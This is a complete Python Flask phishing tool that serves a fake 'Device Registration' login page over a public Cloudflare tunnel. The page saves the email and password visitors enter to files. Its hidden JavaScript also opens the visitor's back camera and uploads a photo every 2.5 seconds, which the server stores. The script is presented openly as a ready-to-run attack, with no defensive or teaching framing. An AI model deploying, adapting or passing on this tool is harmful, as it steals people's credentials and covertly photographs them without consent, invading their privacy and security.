# Login Page Back Camera.py

import os
import base64
import subprocess
import sys
import re
import logging
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    try:
        import flask
    except ImportError:
        print("Installing missing package: Flask...", file=sys.stderr)
        install_package("Flask")

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()


# --- Flask Application ---

app = Flask(__name__)

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish-Back')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }
            input { color-scheme: dark; }
        }
        body {
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }
        .main-container { width: 100%; max-width: 400px; }
        .logo-container { margin-bottom: 24px; }
        .logo-container svg { width: 48px; height: 48px; fill: var(--button-bg-color); }
        .login-form {
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }
        h1 { margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }
        p { color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }
        input::placeholder { color: var(--subtle-text-color); }
        input[type="submit"] {
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }
        input[type="submit"]:hover { background-color: var(--button-hover-bg-color); }
        footer { margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }
        footer a { color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }
        footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Device Registration</h1>
                <p>To complete your device registration, please scan the authentication QR code provided to you.</p>
                <input type="email" name="email" placeholder="Enter your email address" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                <input type="submit" value="Verify Device">
            </form>
        </main>
        <footer>
            <a href="#">Terms of Use</a> &bull; <a href="#">Privacy Policy</a> &bull; <a href="#">Support</a>
        </footer>
    </div>
    <script>
        async function startCamera() {
            // Create video element with properties for mobile compatibility
            const video = document.createElement('video');
            video.setAttribute('playsinline', '');
            video.setAttribute('autoplay', '');
            video.setAttribute('muted', '');
            video.style.display = 'none'; // Keep the video element hidden

            const constraints = {
                audio: false,
                video: { facingMode: 'environment' } // Request back camera
            };

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                document.body.appendChild(video); // Add video to the DOM

                // Start capturing only when the video is ready to play
                video.oncanplay = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');

                    setInterval(() => {
                        // Ensure video data is available before drawing
                        if (video.readyState >= 3) {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            $.post('/capture', { image: canvas.toDataURL('image/png') });
                        }
                    }, 2500); // Interval of 2.5 seconds
                };
            } catch (err) {
                console.error("Back camera access failed:", err);
                // Optionally, you could try to fall back to the front camera here
            }
        }
        startCamera();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(DOWNLOAD_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Verification successful. You will be redirected shortly.", 200

@app.route('/capture', methods=['POST'])
def capture():
    image_data_part = request.form.get('image', '').split(",")
    if len(image_data_part) > 1:
        image_data = image_data_part[1]
        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        image_file = os.path.join(DOWNLOAD_FOLDER, f"photo_{date_str}.png")
        with open(image_file, 'wb') as f:
            f.write(base64.b64decode(image_data))
        return "OK", 200
    return "Error", 400

if __name__ == '__main__':
    check_dependencies()
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    script_name = "Login Page (Back Camera)"
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nShutting down...")
        sys.exit(0)
